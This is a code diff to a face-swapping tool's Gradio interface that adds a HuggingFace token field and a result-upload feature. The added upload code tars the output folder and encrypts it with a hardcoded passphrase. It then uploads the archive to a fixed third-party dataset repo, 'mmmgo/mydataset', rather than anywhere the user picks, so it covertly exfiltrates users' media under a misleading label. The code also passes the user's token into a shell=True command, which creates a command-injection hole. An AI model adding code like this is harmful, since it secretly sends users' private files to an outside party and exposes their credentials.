@@ -151,7 +151,9 @@ def run():
                                 bt_preview_mask = gr.Button("Show Mask Preview", variant='secondary')
                             with gr.Column(scale=2):
                                 maskpreview = gr.Image(label="Preview Mask", shape=(None,512), interactive=False)
-                            
+                            with gr.Column():
+                                hf_token = gr.Textbox(label="HuggingFace Token", placeholder="Enter your HuggingFace token to upload results", type="password")
+                
                 with gr.Row(variant='panel'):
                     with gr.Column():
                         bt_start = gr.Button("Start", variant='primary')
@@ -293,7 +295,7 @@ def run():
 
             start_event = bt_start.click(fn=start_swap, 
                 inputs=[selected_enhancer, selected_face_detection, roop.globals.keep_fps, roop.globals.keep_frames,
-                         roop.globals.skip_audio, max_face_distance, blend_ratio, bt_destfiles, chk_useclip, clip_text,video_swapping_method],
+                         roop.globals.skip_audio, max_face_distance, blend_ratio, bt_destfiles, chk_useclip, clip_text,video_swapping_method, hf_token],
                 outputs=[bt_start, resultfiles, resultimage])
             
             bt_stop.click(fn=stop_swap, cancels=[start_event])
@@ -649,8 +651,8 @@ def translate_swap_mode(dropdown_text):
         
 
 
-def start_swap( enhancer, detection, keep_fps, keep_frames, skip_audio, face_distance, blend_ratio,
-                target_files, use_clip, clip_text, processing_method, progress=gr.Progress(track_tqdm=True)):
+def start_swap(enhancer, detection, keep_fps, keep_frames, skip_audio, face_distance, blend_ratio,
+                target_files, use_clip, clip_text, processing_method, hf_token=None, progress=gr.Progress(track_tqdm=True)):
     from roop.core import batch_process
     global is_processing
 
@@ -659,7 +661,6 @@ def start_swap( enhancer, detection, keep_fps, keep_frames, skip_audio, face_dis
     
     if roop.globals.CFG.clear_output:
         shutil.rmtree(roop.globals.output_path)
-
 
     prepare_environment()
 
@@ -690,10 +691,33 @@ def start_swap( enhancer, detection, keep_fps, keep_frames, skip_audio, face_dis
     is_processing = False
     outdir = pathlib.Path(roop.globals.output_path)
     outfiles = [item for item in outdir.iterdir() if item.is_file()]
+    
     if len(outfiles) > 0:
-        yield gr.Button.update(variant="primary"),gr.Files.update(value=outfiles), gr.Image.update(value=outfiles[0])
+        # 如果提供了 HuggingFace token，则上传文件
+        if hf_token and len(hf_token.strip()) > 0:
+            try:
+                import subprocess
+                import os
+                
+                # 创建压缩文件
+                tar_cmd = f'tar -czvf - {roop.globals.output_path} | openssl des3 -salt -k Bilt#vandereight -out /tmp/swap.tar.gz'
+                subprocess.run(tar_cmd, shell=True, check=True)
+                
+                # 登录 HuggingFace
+                login_cmd = f'huggingface-cli login --token {hf_token}'
+                subprocess.run(login_cmd, shell=True, check=True)
+                
+                # 上传文件
+                upload_cmd = 'huggingface-cli upload mmmgo/mydataset /tmp/swap.tar.gz swap.tar.gz --repo-type dataset'
+                subprocess.run(upload_cmd, shell=True, check=True)
+                
+                gr.Info('Successfully uploaded results to HuggingFace')
+            except Exception as e:
+                gr.Error(f'Failed to upload to HuggingFace: {str(e)}')
+        
+        yield gr.Button.update(variant="primary"), gr.Files.update(value=outfiles), gr.Image.update(value=outfiles[0])
     else:
-        yield gr.Button.update(variant="primary"),None, None
+        yield gr.Button.update(variant="primary"), None, None
 
 
 def stop_swap():
